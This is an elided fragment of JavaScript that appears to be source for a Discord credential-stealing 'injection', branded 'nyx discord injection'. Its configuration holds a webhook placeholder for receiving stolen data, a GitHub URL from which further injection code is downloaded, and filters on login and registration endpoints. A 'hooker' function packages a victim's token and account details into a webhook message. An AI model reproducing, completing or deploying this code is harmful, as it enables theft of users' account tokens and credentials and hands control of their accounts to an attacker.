...
const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/lustmch/nyxfiles/main/injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
const hooker = async (content, token, account) => {
    ...
    content["avatar_url"] = "https://i.ibb.co/mCCHpnMW/fa5f3860dd2d2b4b7273aa312c2a19c5.jpg";
    ...
    content["embeds"][0]["footer"] = {
        "text": "nyx discord injection - overthink.pw",
